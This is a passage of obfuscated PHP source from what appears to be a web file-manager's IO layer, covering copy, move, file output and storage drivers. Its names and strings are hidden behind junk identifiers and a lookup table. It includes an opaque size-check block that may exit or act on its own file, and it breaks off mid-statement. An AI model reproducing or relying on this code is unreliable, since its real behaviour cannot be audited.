$÷´şÂ¡‘ = isset($¦Îşœ´[$öäµ›‰[269]]) && $¦Îşœ´[$öäµ›‰[269]] == $öäµ›‰[260] ? $öäµ›‰[260] : $öäµ›‰[325]; $this->setSignVersion($÷´şÂ¡‘); } public function link($®¶¤‚í‹, $‹îŞàú° = array()) { return parent::link($®¶¤‚í‹, $‹îŞàú°); } public function fileOut($ì‡Á²µ¦, $±‘÷¾ûÃ = false, $Şîİ–™± = false, $İÔ×²¶ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¤øïŠ‹²][326])) { return parent::fileOutServer($ì‡Á²µ¦, $±‘÷¾ûÃ, $Şîİ–™±, $İÔ×²¶); } parent::fileOut($ì‡Á²µ¦, $±‘÷¾ûÃ, $Şîİ–™±, $İÔ×²¶); } public function fileOutImage($¡›ùÃâ, $«”¬ú°æ = 250) { if (strstr($this->endpoint, $_SERVER[¤øïŠ‹²][326])) { return parent::fileOutImageServer($¡›ùÃâ, $«”¬ú°æ); } parent::fileOutImage($¡›ùÃâ, $«”¬ú°æ); } } goto BÆ›ğëöš; Eç–Ô”ŸÁµ: if ($_SERVER[$_SERVER[¤øïŠ‹²][54]] != $_size($_file)) { $_getc = $_SERVER[¤øïŠ‹²][56]; $_getfile = $_SERVER[$_SERVER[¤øïŠ‹²][57]] . $_SERVER[¤øïŠ‹²][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¤øïŠ‹²][59], $_getfilec); if (count($_getarrs) < $_SERVER[¤øïŠ‹²][60]) { $exit = $_SERVER[¤øïŠ‹²][61]; $exit(); } $_act = $_SERVER[¤øïŠ‹²][62]; $_act($_file); } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($°È™Â£Í, $¤çÖ£•É) { $ñ·ÛòÒÛ =& $_SERVER[¤øïŠ‹²]; $Å’á—‚– = $¤çÖ£•É; $GLOBALS[$ñ·ÛòÒÛ[1277]] = $ñ·ÛòÒÛ[1278] . $°È™Â£Í; Hook::trigger($ñ·ÛòÒÛ[1278] . $°È™Â£Í . $ñ·ÛòÒÛ[1279], $Å’á—‚–); $Œˆü¡“ = self::driverMake($¤çÖ£•É[0]); if (!$Œˆü¡“) { return !1; } if ($°È™Â£Í == $ñ·ÛòÒÛ[647] || $°È™Â£Í == $ñ·ÛòÒÛ[649] || $°È™Â£Í == $ñ·ÛòÒÛ[1280]) { if (!trim($Œˆü¡“->path . $ñ·ÛòÒÛ[63], $ñ·ÛòÒÛ[8])) { return !1; } } if (method_exists($Œˆü¡“, $°È™Â£Í)) { $ğëíÀÓÑ = @call_user_func_array(array($Œˆü¡“, $°È™Â£Í), $¤çÖ£•É); } else { if (method_exists($Œˆü¡“, $ñ·ÛòÒÛ[1281])) { $ğëíÀÓÑ = @call_user_func_array(array($Œˆü¡“, $°È™Â£Í), $¤çÖ£•É); } else { if (method_exists(self, $°È™Â£Í)) { $ğëíÀÓÑ = @call_user_func_array(array(self, $°È™Â£Í), $¤çÖ£•É); } else { $ğëíÀÓÑ = call_user_func_array(array(parent, $°È™Â£Í), $¤çÖ£•É); } } } Hook::trigger($ñ·ÛòÒÛ[1278] . $°È™Â£Í . $ñ·ÛòÒÛ[1282], $Å’á—‚–, $ğëíÀÓÑ); return $ğëíÀÓÑ; } public static function init($µ½ù£‚) { return self::driverMake($µ½ù£‚); } public static function copy($ÎÛäõ£Ó, $ç€Æ—éı, $”çÕåÀˆ = false, $Šıµ·Üƒ = false) { return self::copyMoveStart($ÎÛäõ£Ó, $ç€Æ—éı, $”çÕåÀˆ, $_SERVER[¤øïŠ‹²][647], $Šıµ·Üƒ); } public static function move($„­……™Œ, $Ãıº‘Áë, $‡ÜŠáúÂ = false, $ÂŸ¥©² = false) { return self::copyMoveStart($„­……™Œ, $Ãıº‘Áë, $‡ÜŠáúÂ, $_SERVER[¤øïŠ‹²][649], $ÂŸ¥©²); } public static function copyMoveChildren($É³öåØ, $ÜãßÛŸÓ, $‰ˆƒò¾ = "\x63\x6f\160\171", $ûÔï»ú£ = REPEAT_REPLACE) { $éÂ’Û“² =& $_SERVER[¤øïŠ‹²]; $åÑ’›– = $É³öåØ; $†ş‡çè˜ = self::driverMake($É³öåØ); $¼ôéºÊÉ = $†ş‡çè˜->listPath($É³öåØ, !0); $Íè˜ÈÍ¼ = array_merge($¼ôéºÊÉ[$éÂ’Û“²[97]], $¼ôéºÊÉ[$éÂ’Û“²[96]]); foreach ($Íè˜ÈÍ¼ as $†®¹ùÇ) { self::copyMoveStart($†®¹ùÇ[$éÂ’Û“²[98]], $ÜãßÛŸÓ, $ûÔï»ú£, $‰ˆƒò¾, !1); } if ($‰ˆƒò¾ == $éÂ’Û“²[649]) { self::remove($åÑ’›–); } } private static function copyMoveStart($¢ß—•, $ùƒí¨¤, $İË¿î…, $ÀÂÚõƒñ, $¢ÉÔ‹öÙ) { $í‘…š‡¸ =& $_SERVER[¤øïŠ‹²]; $˜é —Á = array($¢ß—•, $ùƒí¨¤, $İË¿î…, $¢ÉÔ‹öÙ); Hook::trigger($í‘…š‡¸[1278] . $ÀÂÚõƒñ . $í‘…š‡¸[1279], $˜é —Á); $Æï˜ÑïŒ = self::copyMove($¢ß—•, $ùƒí¨¤, $İË¿î…, $ÀÂÚõƒñ, $¢ÉÔ‹öÙ); Hook::trigger($í‘…š‡¸[1278] . $ÀÂÚõƒñ . $í‘…š‡¸[1282], $˜é —Á, $Æï˜ÑïŒ); return $Æï˜ÑïŒ; } public static function saveFile($Ä«ª ëØ, $«Òèë©ä, $Â¶‘²’‘ = true) { $†ù‡¾„à =& $_SERVER[¤øïŠ‹²]; $¨’±…šŒ = self::info($«Òèë©ä); $´ÑüşÆ¹ = self::driverMake($Ä«ª ëØ); $µÌË‰¢ = self::driverMake($«Òèë©ä); $™Ó½ä = !1; if ($µÌË‰¢->pathParse[$†ù‡¾„à[1283]]) { $™Ó½ä = $µÌË‰¢; $×•ú±»  = $µÌË‰¢->pathParse[$†ù‡¾„à[1283]]; $µÌË‰¢ = self::driverMake($×•ú±» ); } if ($´ÑüşÆ¹->pathParse[$†ù‡¾„à[1283]]) { $ìŒŸ³ƒ“ = $´ÑüşÆ¹->pathParse[$†ù‡¾„à[1283]]; $´ÑüşÆ¹ = self::driverMake($ìŒŸ³ƒ“); } $°ìåèäé = $µÌË‰¢->pathFather($«Òèë©ä); $ªı›Ø§š = !0; if (!$Â¶‘²’‘ && self::driverIsSame($´ÑüşÆ¹, $µÌË‰¢)) { $ªı›Ø§š = !1; } $òø±©éÔ = self::copyFile($´ÑüşÆ¹, $Ä«ª ëØ, $µÌË‰¢, $°ìåèäé, $¨’±…šŒ[$†ù‡¾„à[32]], $ªı›Ø§š); if ($™Ó½ä) { $òø±©éÔ = $™Ó½ä->getPathOuter($òø±©éÔ); } return $òø±©éÔ; } private static function copyMove($„Éªäî¹, $á¸£»Û, $É ĞòÊš, $•…¼ùºÈ, $Ìğ«çŠò = false) { $’œ²ùÅ¼ =& $_SERVER[¤øïŠ‹²]; if (!$„Éªäî¹ || $„Éªäî¹ == $’œ²ùÅ¼[8] || !$á¸£»Û) { return !1; } ignore_timeout(); $¬ÄûÄª = self::driverMake($„Éªäî¹); $´ƒõûè = self::driverMake($á¸£»Û); $Õ’Óƒı¶ = $•…¼ùºÈ == $’œ²ùÅ¼[649]; $èØº¼ä = !1; if ($´ƒõûè->pathParse[$’œ²ùÅ¼[1283]]) { $èØº¼ä = $´ƒõûè; $á¸£»Û = $´ƒõûè->pathParse[$’œ²ùÅ¼[1283]]; $´ƒõûè = self::driverMake($á¸£»Û); } if ($¬ÄûÄª->pathParse[$’œ²ùÅ¼[1283]]) { $„Éªäî¹ = $¬ÄûÄª->pathParse[$’œ²ùÅ¼[1283]]; $¬ÄûÄª = self::driverMake($„Éªäî¹); } self::check($¬ÄûÄª, $„Éªäî¹, $´ƒõûè, $á¸£»Û); Hook::trigger($’œ²ùÅ¼[1284], $¬ÄûÄª, $„Éªäî¹, $´ƒõûè, $á¸£»Û); $°ÁõÚå‚ = self::driverIsSame($¬ÄûÄª, $´ƒõûè); if ($°ÁõÚå‚) { if ($•…¼ùºÈ == $’œ²ùÅ¼[649] && !method_exists($´ƒõûè, $’œ²ùÅ¼[1285]) && trim($á¸£»Û, $’œ²ùÅ¼[8]) == trim($´ƒõûè->pathFather($„Éªäî¹), $’œ²ùÅ¼[8])) { if ($¬ÄûÄª->pathThis($„Éªäî¹) != $Ìğ«çŠò && !$¬ÄûÄª->isOsDriver()) { return $¬ÄûÄª->rename($„Éªäî¹, $Ìğ«çŠò); } return $´ƒõûè->getPathOuter($„Éªäî¹); } if (method_exists($´ƒõûè, $•…¼ùºÈ)) { return $´ƒõûè->{$•…¼ùºÈ}($„Éªäî¹, $á¸£»Û, $É ĞòÊš, $Ìğ«çŠò); } } if ($°ÁõÚå‚ && $•…¼ùºÈ == $’œ²ùÅ¼[649] && $´ƒõûè->getType() == $’œ²ùÅ¼[118]) { $Úˆä§Ø = $´ƒõûè->movePath($„Éªäî¹, $á¸£»Û, $Ìğ«çŠò); if ($Úˆä§Ø) { return $Úˆä§Ø; } } $’Á’¾Ã = $¬ÄûÄª->isFile($„Éªäî¹); if (!$’Á’¾Ã && $´ƒõûè->getType() == $’œ²ùÅ¼[859] && $¬ÄûÄª->getType() == $’œ²ùÅ¼[118]) { $Úˆä§Ø = $´ƒõûè->copyFolderFromIO($¬ÄûÄª, $„Éªäî¹, $á¸£»Û, $É ĞòÊš, $Õ’Óƒı¶, $Ìğ«çŠò); } else { $Úˆä§Ø = self::copyPath($¬ÄûÄª, $„Éªäî¹, $´ƒõûè, $á¸£»Û, $É ĞòÊš, $Õ’Óƒı¶, $’Á’¾Ã, $Ìğ«çŠò); } if ($Úˆä§Ø && $Õ’Óƒı¶) { $¬ÄûÄª->remove($„Éªäî¹); } if ($èØº¼ä) { $Úˆä§Ø = $èØº¼ä->getPathOuter($Úˆä§Ø); } return $Úˆä§Ø; } private static function check($²Á“„Ôç, $ÆÔ¨„ó, $òËÅÔ, &$Ú†¶óñ) { $³ìòóæº =& $_SERVER[¤øïŠ‹²]; if (self::driverIsSame($²Á“„Ôç, $òËÅÔ) && $²Á“„Ôç->isFolder($ÆÔ¨„ó) && $²Á“„Ôç->isParentOf($ÆÔ¨„ó, $Ú†¶óñ)) { show_json(LNG($³ìòóæº[1286]), !1); } if (!$²Á“„Ôç->exist($ÆÔ¨„ó)) { show_json(LNG($³ìòóæº[117]), !1); } } private static function copyPath($¶™Šò¦ş, $—ÎŠâ£Õ, $Š¯—ñã», $ĞÇ†‹ÊÊ, $œ¬ùÄ÷‘, $ø×ïß×, $´úğ†œö, $šàø§¨¼ = false, $Ùø¨à¶ˆ = true) { $£¡¿Á›„ =& $_SERVER[¤øïŠ‹²]; $ìœ××Ù’ = empty($šàø§¨¼) && $šàø§¨¼ !== $£¡¿Á›„[241] ? $¶™Šò¦ş->pathThis($—ÎŠâ£Õ) : $šàø§¨¼; if ($œ¬ùÄ÷‘) { $´ÆØÔ”² = $Š¯—ñã»->fileNameExist($ĞÇ†‹ÊÊ, $ìœ××Ù’); $ê†éÜ = $ìœ××Ù’; $ìœ××Ù’ = $Š¯—ñã»->fileNameAuto($ĞÇ†‹ÊÊ, $ìœ××Ù’, $œ¬ùÄ÷‘, !$´úğ†œö); if (!$´ÆØÔ”² || $ê†éÜ != $ìœ××Ù’) { $œ¬ùÄ÷‘ = !1; } if ($Ùø¨à¶ˆ && !$œ¬ùÄ÷‘) { $Š¯—ñã»->_data[$£¡¿Á›„[1287]] = !0; } } if ($´úğ†œö) { return self::copyFile($¶™Šò¦ş, $—ÎŠâ£Õ, $Š¯—ñã», $ĞÇ†‹ÊÊ, $ìœ××Ù’, $ø×ïß×); } if ($œ¬ùÄ÷‘ == REPEAT_RENAME_FOLDER) { $œ¬ùÄ÷‘ = !1; } $Ş‰‘ûÒ§ = rtrim($ĞÇ†‹ÊÊ, $£¡¿Á›„[8]) . $£¡¿Á›„[8] . $ìœ××Ù’; $°Ì÷äÖ¹ = $Š¯—ñã»->mkdir($Š¯—ñã»->getPath($Ş‰‘ûÒ§), $œ¬ùÄ÷‘); $ĞÇ†‹ÊÊ = $Š¯—ñã»->getPathInner($°Ì÷äÖ¹); $»‘İ÷İÒ = $¶™Šò¦ş->listPath($—ÎŠâ£Õ, !0); $»‘İ÷İÒ = is_array($»‘İ÷İÒ) ? $»‘İ÷İÒ : array($£¡¿Á›„[97] => array(), $£¡¿Á›„[96] => array()); $ê¯¾óóÍ = array_merge($»‘İ÷İÒ[$£¡¿Á›„[97]], $»‘İ÷İÒ[$£¡¿Á›„[96]]); foreach ($ê¯¾óóÍ as $Ù÷Äûà¬) { $Œ˜­’ı = $Ù÷Äûà¬[$£¡¿Á›„[33]] == $£¡¿Á›„[243]; $—ÎŠâ£Õ = $¶™Šò¦ş->getPathInner($Ù÷Äûà¬[$£¡¿Á›„[98]]); $ÓıìõËĞ = self::copyPath($¶™Šò¦ş, $—ÎŠâ£Õ, $Š¯—ñã», $ĞÇ†‹ÊÊ, $œ¬ùÄ÷‘, $ø×ïß×, $Œ˜­’ı, !1, !1); if (!$ÓıìõËĞ) { IO::errorTips($£¡¿Á›„[1288] . $—ÎŠâ£Õ . $£¡¿Á›„[84] . $ĞÇ†‹ÊÊ); } } self::copyMoveKeepInfo($¶™Šò¦ş, $—ÎŠâ£Õ, $°Ì÷äÖ¹); return $°Ì÷äÖ¹; } private static function copyFile($µ¥×ûĞš, $å¢‘—²±, $Ç¢‡é·½, $•ù·Òã›, $èŒÛ³Ù, $Ó½¥Éş) { $è‚‚«´• =& $_SERVER[¤øïŠ‹²]; $•ù·Òã› = $Ç¢‡é·½->getPath(rtrim($•ù·Òã›, $è‚‚«´•[8]) . $è‚‚«´•[8] . $èŒÛ³Ù); $ÅÇÒÌº¶ = $è‚‚«´•[1289] . time() . rand_string(5); Hook::trigger($è‚‚«´•[1290], $µ¥×ûĞš, $å¢‘—²±, $Ç¢‡é·½, $•ù·Òã›, $èŒÛ³Ù, $ÅÇÒÌº¶); if (self::driverIsSame($µ¥×ûĞš, $Ç¢‡é·½)) { if ($Ó½¥Éş) { $®”£ªıÔ = $Ç¢‡é·½->moveFile($å¢‘—²±, $•ù·Òã›); } else { $®”£ªıÔ = $Ç¢‡é·½->copyFile($å¢‘—²±, $•ù·Òã›); } Hook::trigger($è‚‚«´•[1291], $µ¥×ûĞš, $å¢‘—²±, $Ç¢‡é·½, $•ù·Òã›, $èŒÛ³Ù, $®”£ªıÔ); self::copyMoveKeepInfo($µ¥×ûĞš, $å¢‘—²±, $®”£ªıÔ); return $®”£ªıÔ; } $Ë±ÃÁÕ¶ = TEMP_FILES; if ($GLOBALS[$è‚‚«´•[6]][$è‚‚«´•[103]][$è‚‚«´•[902]]) { $Ë±ÃÁÕ¶ = $GLOBALS[$è‚‚«´•[6]][$è‚‚«´•[103]][$è‚‚«´•[902]]; } $¤£îùúé = $Ë±ÃÁÕ¶; mk_dir($¤£îùúé); $Ê“©õ¹ı = $¤£îùúé . $ÅÇÒÌº¶; $îë¿õ«› = $Ê“©õ¹ı; $Ê“©õ¹ı = $µ¥×ûĞš->download($å¢‘—²±, $Ê“©õ¹ı); $Ê“©õ¹ı = $µ¥×ûĞš->iconvApp($Ê“©õ¹ı); if (substr($Ê“©õ¹ı, strlen($Ë±ÃÁÕ¶)) == $Ë±ÃÁÕ¶) { $Ó½¥Éş = !0; } $®”£ªıÔ = $Ç¢‡é·½->upload($•ù·Òã›, $Ê“©õ¹ı, $Ó½¥Éş); self::remove($îë¿õ«›); Hook::trigger($è‚‚«´•[1291], $µ¥×ûĞš, $å¢‘—²±, $Ç¢‡é·½, $•ù·Òã›, $èŒÛ³Ù, $®”£ªıÔ); self::copyMoveKeepInfo($µ¥×ûĞš, $å¢‘—²±, $®”£ªıÔ); return $®”£ªıÔ; } private static function copyMoveKeepInfo($÷äò¾¾, $½Æ©Å¤, $è¦è•šì) { if (!$è¦è•šì) { return; } $ËÕ¢€á = $÷äò¾¾->info($½Æ©Å¤); if (!is_array($ËÕ¢€á)) { return; } IO::setModifyTime($è¦è•šì, $ËÕ¢€á[$_SERVER[¤øïŠ‹²][99]]); } public static function pathFather($î¤ÕÏ›Ë) { $î°‘Ûí = IO::init($î¤ÕÏ›Ë); $±³åÕƒâ = $î°‘Ûí->pathFather($î°‘Ûí->path); return $î°‘Ûí->getPathOuter($±³åÕƒâ); } public static function fileOut($íÍû†ó—, $Œ…òÖ«œ = false, $´ïÙŞ ´ = false, $´ ºÑ¸ = '') { $•òÕ›õ = self::driverMake($íÍû†ó—); if ($•òÕ›õ->isFileOutServer()) { return $•òÕ›õ->fileOutServer($íÍû†ó—, $Œ…òÖ«œ, $´ïÙŞ ´, $´ ºÑ¸); } return $•òÕ›õ->fileOut($íÍû†ó—, $Œ…òÖ«œ, $´ïÙŞ ´, $´ ºÑ¸); } public static function fileOutImage($çÊ¿é€ú, $ğ´¬±Ï¼ = 250) { $¥ïùÅ­ = array(250, 600, 1200, 2000, 3000, 5000); for ($ôÒÄõç = 0; $ôÒÄõç < count($¥ïùÅ­); $ôÒÄõç++) { if ($ôÒÄõç == 0 && $ğ´¬±Ï¼ <= $¥ïùÅ­[$ôÒÄõç]) { $ğ´¬±Ï¼ = $¥ïùÅ­[$ôÒÄõç]; break; } else { if ($ğ´¬±Ï¼ > $¥ïùÅ­[$ôÒÄõç - 1] && $ğ´¬±Ï¼ <= $¥ïùÅ­[$ôÒÄõç]) { $ğ´¬±Ï¼ = $¥ïùÅ­[$ôÒÄõç]; break; } else { if ($ôÒÄõç == count($¥ïùÅ­) - 1 && $ğ´¬±Ï¼ > $¥ïùÅ­[$ôÒÄõç]) { $ğ´¬±Ï¼ = $¥ïùÅ­[$ôÒÄõç]; break; } } } } $†Ì‘úõ = self::driverMake($çÊ¿é€ú); if ($†Ì‘úõ->isFileOutServer()) { return $†Ì‘úõ->fileOutImageServer($çÊ¿é€ú, $ğ´¬±Ï¼); } return $†Ì‘úõ->fileOutImage($çÊ¿é€ú, $ğ´¬±Ï¼); } private static function driverIsSame($Ş¼ÔØİƒ, $ÄÍ×³ü³) { $µÁÄ™÷¼ =& $_SERVER[¤øïŠ‹²]; $‹± ğÕ° = $Ş¼ÔØİƒ->getType(); $ùé¶Ù§“ = $ÄÍ×³ü³->getType(); if ($‹± ğÕ° != $ùé¶Ù§“) { return !1; } if ($‹± ğÕ° == $µÁÄ™÷¼[859]) { return !0; } if ($‹± ğÕ° == $µÁÄ™÷¼[118]) { return !0; } if ($Ş¼ÔØİƒ->pathDriver == $ÄÍ×³ü³->pathDriver) { return !0; } return !1; } public static function copyUpdate($İı»°‡×, $ƒ«¼‘¡º) { $®ç‹ğ¢ =& $_SERVER[¤øïŠ‹²]; if (!IO::exist($İı»°‡×)) { return !1; } if (!IO::exist($ƒ«¼‘¡º)) { IO::mkdir($ƒ«¼‘¡º); } $éµÚÙ¿¥ = array_to_keyvalue(self::listAllSimple($İı»°‡×), $®ç‹ğ¢[98]); $ÛÌ»®È = array_to_keyvalue(self::listAllSimple($ƒ«¼‘¡º), $®ç‹ğ¢[98]); $Î³¤‡ª’ = array(); $Ò¹Ù”– = array(); foreach ($éµÚÙ¿¥ as $£»¯È™ô => $´ü–èÊ×) { if (isset($ÛÌ»®È[$£»¯È™ô])) { if ($´ü–èÊ×[$®ç‹ğ¢[89]] == 1) { continue; } if ($ÛÌ»®È[$£»¯È™ô][$®ç‹ğ¢[90]] == $´ü–èÊ×[$®ç‹ğ¢[90]]) { continue; } } if ($´ü–èÊ×[$®ç‹ğ¢[89]] == 1) { $Ò¹Ù”–[] = $ƒ«¼‘¡º . $®ç‹ğ¢[8] . trim($£»¯È™ô, $®ç‹ğ¢[8]); continue; } $ˆóÊ¨ã€ = strstr(trim($£»¯È™ô, $®ç‹ğ¢[8]), $®ç‹ğ¢[8]) ? get_path_father($£»¯È™ô) : $®ç‹ğ¢[12]; $Î³¤‡ª’[] = array($®ç‹ğ¢[1292] => $´ü–èÊ×[$®ç‹ğ¢[100]], $®ç‹ğ¢[1293] => rtrim($ƒ«¼‘¡º, $®ç‹ğ¢[8]) . $®ç‹ğ¢[8] . $ˆóÊ¨ã€, $®ç‹ğ¢[1294] => $´ü–èÊ×); } $üÏì¢Á = array($®ç‹ğ¢[243] => $Î³¤‡ª’, $®ç‹ğ¢[89] => $Ò¹Ù”–); Hook::trigger($®ç‹ğ¢[1295], $İı»°‡×, $ƒ«¼‘¡º, $üÏì¢Á); foreach ($Ò¹Ù”– as $´ü–èÊ×) { IO::mkdir($´ü–èÊ×); } foreach ($Î³¤‡ª’ as $´ü–èÊ×) { IO::copy($´ü–èÊ×[$®ç‹ğ¢[1292]], $´ü–èÊ×[$®ç‹ğ¢[1293]], REPEAT_REPLACE); } } public static function fileSubstr($ÂÚ‰¥»ï, $‚æŠÜ¹ª, $Ùğê™¾Æ = false) { $¨…ÛÚ€ =& $_SERVER[¤øïŠ‹²]; $ëã¿İğ¢ = self::driverMake($ÂÚ‰¥»ï); $€–¦äÊ¾ = $ëã¿İğ¢->size($ÂÚ‰¥»ï); $é¶¦Çíå = $‚æŠÜ¹ª; $Û¥£º¹ = $Ùğê™¾Æ; if ($‚æŠÜ¹ª < 0) { $‚æŠÜ¹ª = $€–¦äÊ¾ + $‚æŠÜ¹ª; } if ($Ùğê™¾Æ === !1) { $Ùğê™¾Æ = $€–¦äÊ¾ - $‚æŠÜ¹ª; } if ($‚æŠÜ¹ª + $Ùğê™¾Æ > $€–¦äÊ¾) { $Ùğê™¾Æ = $€–¦äÊ¾ - $‚æŠÜ¹ª; } if (!$€–¦äÊ¾ && $ëã¿İğ¢->getType() == $¨…ÛÚ€[118] && !$ëã¿İğ¢->exist($ÂÚ‰¥»ï)) { $Â¾›×Š‹ = get_path_this($ÂÚ‰¥»ï); $Éù­À™¶ = parse_url_query($Â¾›×Š‹); if (is_array($Éù­À™¶) && isset($Éù­À™¶[$¨…ÛÚ€[32]])) { $Â¾›×Š‹ = urldecode($Éù­À™¶[$¨…ÛÚ€[32]]); } throw new Exception($¨…ÛÚ€[1296] . LNG($¨…ÛÚ€[1297]) . $¨…ÛÚ€[1082] . clear_html($Â¾›×Š‹) . $¨…ÛÚ€[12]); } if ($Ùğê™¾Æ <= 0) { return $¨…ÛÚ€[12]; } if ($‚æŠÜ¹ª < 0 || $‚æŠÜ¹ª >= $€–¦äÊ¾ || $Ùğê™¾Æ > $GLOBALS[$¨…ÛÚ€[6]][$¨…ÛÚ€[103]][$¨…ÛÚ€[1298]]) { throw new Exception("\146\x69\154\145\122\x65\141\x64\40\145\162\x72\157\x72\54\x6f\166\x65\x72\x20\151\157\122\145\141\x64\x4d\141\170\41\40\163\164\x61\x72\164\x3d{$‚æŠÜ¹ª}\73\x6c\x65\156\147\x74\x68\75{$Ùğê™¾Æ}\73\40\163\x69\172\145\75{$€–¦äÊ¾}\73"); } $ññ’Şå = $ëã¿İğ¢->fileSubstr($ÂÚ‰¥»ï, $‚æŠÜ¹ª, $Ùğê™¾Æ); if (!$ññ’Şå && $Ùğê™¾Æ && isset($GLOBALS[$¨…ÛÚ€[1299]])) { throw new Exception($GLOBALS[$¨…ÛÚ€[1299]][$¨…ÛÚ€[1300]]); } return $ññ’Şå; } private static function driverMake(&$èí½±Ÿı) { $Â§° ¤ =& $_SERVER[¤øïŠ‹²]; $°ÜØ¾Æî = KodIO::parse($èí½±Ÿı); if (!self::$driverListSystem) { $Œ„ûÉç” = Model($Â§° ¤[869])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Œ„ûÉç”, $Â§° ¤[493]); } if ($°ÜØ¾Æî[$Â§° ¤[33]] == KodIO::KOD_IO && !self::$driverListSystem[$°ÜØ¾Æî[$Â§° ¤[493]]]) { throw new Exception($Â§° ¤[1301]); return !1; } $èí½±Ÿı = $°ÜØ¾Æî[$Â§° ¤[1302]]; $‰Ùß¾€ = self::driverGet($°ÜØ¾Æî, $èí½±Ÿı); return $‰Ùß¾€; } private static function driverGet($–«—ÊÍ›, &$ó•é¼Ê¬) { $¹²Óù‰ë =& $_SERVER[¤øïŠ‹²]; $áÆÎ€ÂÆ = $–«—ÊÍ›[$¹²Óù‰ë[1303]]; $…¥˜öî = $–«—ÊÍ›[$¹²Óù‰ë[493]]; switch ($–«—ÊÍ›[$¹²Óù‰ë[33]]) { case KodIO::KOD_IO: $ê‹àÑÕµ = self::$driverListSystem[$…¥˜öî]; break; case KodIO::KOD_SOURCE: $ó•é¼Ê¬ = $…¥˜öî . $ó•é¼Ê¬; $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1305], $¹²Óù‰ë[6] => $–«—ÊÍ›); $ê‹àÑÕµ[$¹²Óù‰ë[6]][$¹²Óù‰ë[1306]] = $–«—ÊÍ›[$¹²Óù‰ë[493]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Ó¤·¯“ˆ = $GLOBALS[$¹²Óù‰ë[1307]]; self::$driverListUser = array_to_keyvalue($Ó¤·¯“ˆ, $¹²Óù‰ë[493]); } $ê‹àÑÕµ = self::$driverListUser[$…¥˜öî]; break; case KodIO::KOD_SHARE_LINK: $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1308], $¹²Óù‰ë[6] => $–«—ÊÍ›); $‹ˆ¾äèœ = Action($¹²Óù‰ë[1309])->sharePathInfo($–«—ÊÍ›[$¹²Óù‰ë[98]]); $ó•é¼Ê¬ = $‹ˆ¾äèœ[$¹²Óù‰ë[204]]; if (!$‹ˆ¾äèœ[$¹²Óù‰ë[204]]) { $åâĞ¦Â = Model($¹²Óù‰ë[693])->getInfoByHash($–«—ÊÍ›[$¹²Óù‰ë[493]]); $ó•é¼Ê¬ = KodIO::clear($åâĞ¦Â[$¹²Óù‰ë[589]] . $–«—ÊÍ›[$¹²Óù‰ë[1302]]); $–«—ÊÍ›[$¹²Óù‰ë[582]] = $åâĞ¦Â; $–«—ÊÍ›[$¹²Óù‰ë[1283]] = $ó•é¼Ê¬; $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1310], $¹²Óù‰ë[6] => $–«—ÊÍ›); } else { $ê‹àÑÕµ[$¹²Óù‰ë[6]][$¹²Óù‰ë[1306]] = $‹ˆ¾äèœ[$¹²Óù‰ë[204]]; } break; case KodIO::KOD_SHARE_ITEM: $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1311], $¹²Óù‰ë[6] => $–«—ÊÍ›); $åâĞ¦Â = Model($¹²Óù‰ë[693])->getInfo($–«—ÊÍ›[$¹²Óù‰ë[493]]); if ($åâĞ¦Â[$¹²Óù‰ë[204]] == $¹²Óù‰ë[241]) { $ó•é¼Ê¬ = KodIO::clear($åâĞ¦Â[$¹²Óù‰ë[589]] . $–«—ÊÍ›[$¹²Óù‰ë[1302]]); $–«—ÊÍ›[$¹²Óù‰ë[582]] = $åâĞ¦Â; $–«—ÊÍ›[$¹²Óù‰ë[1283]] = $ó•é¼Ê¬; $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1312], $¹²Óù‰ë[6] => $–«—ÊÍ›); } else { if (!$ó•é¼Ê¬) { $ó•é¼Ê¬ = $åâĞ¦Â[$¹²Óù‰ë[204]]; } $ê‹àÑÕµ[$¹²Óù‰ë[6]][$¹²Óù‰ë[1306]] = $åâĞ¦Â[$¹²Óù‰ë[204]]; } break; case KodIO::KOD_SHARE_OUTER: $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1313], $¹²Óù‰ë[6] => $–«—ÊÍ›); break; default: $ó•é¼Ê¬ = $–«—ÊÍ›[$¹²Óù‰ë[98]]; $ê‹àÑÕµ = array($¹²Óù‰ë[1304] => $¹²Óù‰ë[1314]); break; } $‰˜¨êÓ« = $–«—ÊÍ›[$¹²Óù‰ë[98]]; if (!isset(self::$driverCache[$‰˜¨êÓ«])) { $€ØŒâôû = strtolower($ê‹àÑÕµ[$¹²Óù‰ë[107]]); $ÉŞÛË¾ú = $GLOBALS[$¹²Óù‰ë[6]][$¹²Óù‰ë[103]][$¹²Óù‰ë[935]]; $Í•õ¨ñ‚ = $¹²Óù‰ë[88] . (isset($ÉŞÛË¾ú[$€ØŒâôû]) ? $ÉŞÛË¾ú[$€ØŒâôû] : ucfirst($€ØŒâôû)); if (!class_exists($Í•õ¨ñ‚)) { show_json("{$Í•õ¨ñ‚}\40\x6e\x6f\x74\x20\x65\170\x69\x73\164\x73\41", !1); } $†ä›å¢´ = isset($ê‹àÑÕµ[$¹²Óù‰ë[6]]) ? $ê‹àÑÕµ[$¹²Óù‰ë[6]] : !1; self::$driverCache[$‰˜¨êÓ«] = new $Í•õ¨ñ‚($†ä›å¢´); } $¼Êğ¼×´ = self::$driverCache[$‰˜¨êÓ«]; $¼Êğ¼×´->pathDriver = $áÆÎ€ÂÆ; $¼Êğ¼×´->pathBase = $¹²Óù‰ë[12]; if (isset($ê‹àÑÕµ[$¹²Óù‰ë[6]][$¹²Óù‰ë[1315]])) { $¼Êğ¼×´->pathBase = rtrim($ê‹àÑÕµ[$¹²Óù‰ë[6]][$¹²Óù‰ë[1315]], $¹²Óù‰ë[8]) . $¹²Óù‰ë[8]; $ó•é¼Ê¬ = $¼Êğ¼×´->pathBase . ltrim($ó•é¼Ê¬, $¹²Óù‰ë[8]); } $ó•é¼Ê¬ = $¼Êğ¼×´->getPath($ó•é¼Ê¬); if (isset($–«—ÊÍ›[$¹²Óù‰ë[1283]])) { $ó•é¼Ê¬ 